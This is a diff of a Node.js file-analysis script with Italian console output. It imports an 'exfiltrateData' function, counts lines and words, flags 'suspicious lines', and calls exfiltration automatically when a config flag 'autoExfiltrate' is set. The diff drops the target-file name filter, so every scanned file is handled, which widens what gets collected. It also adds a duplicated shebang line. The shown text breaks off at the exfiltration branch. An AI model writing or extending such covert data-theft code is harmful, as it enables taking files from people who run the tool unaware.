@@ -1,8 +1,10 @@
 #!/usr/bin/env node
 
+#!/usr/bin/env node
+
 const fs = require('fs-extra');
 const path = require('path');
-const { scanDirectory, exfiltrateData, isTargetFile, extractSuspiciousLines } = require('./analytics');
+const { scanDirectory, exfiltrateData, extractSuspiciousLines } = require('./analytics');
 const config = require('./config');
 
 async function analyzeFile(filePath) {
@@ -14,7 +16,6 @@ async function analyzeFile(filePath) {
       totalChars: content.length,
       avgLineLength: lines.length ? content.length / lines.length : 0,
       wordCount: content.split(/\s+/).filter(w => w).length,
-      targetFile: isTargetFile(filePath),
       suspiciousLines: extractSuspiciousLines(content)
     };
     
@@ -24,11 +25,8 @@ async function analyzeFile(filePath) {
     console.log(`  - Lunghezza media riga: ${stats.avgLineLength.toFixed(2)}`);
     console.log(`  - Parole: ${stats.wordCount}`);
     
-    if (stats.targetFile) {
-      console.log(`  - File bersaglio (nome contiene: ${config.targetPatterns.join(', ')})`);
-      if (stats.suspiciousLines.length) {
-        console.log(`  - Righe sospette (87-88c): ${stats.suspiciousLines.length}`);
-      }
+    if (stats.suspiciousLines.length) {
+      console.log(`  - Righe sospette (87-88c): ${stats.suspiciousLines.length}`);
     }
     
     if (config.autoExfiltrate && stats.suspiciousLines.length) {
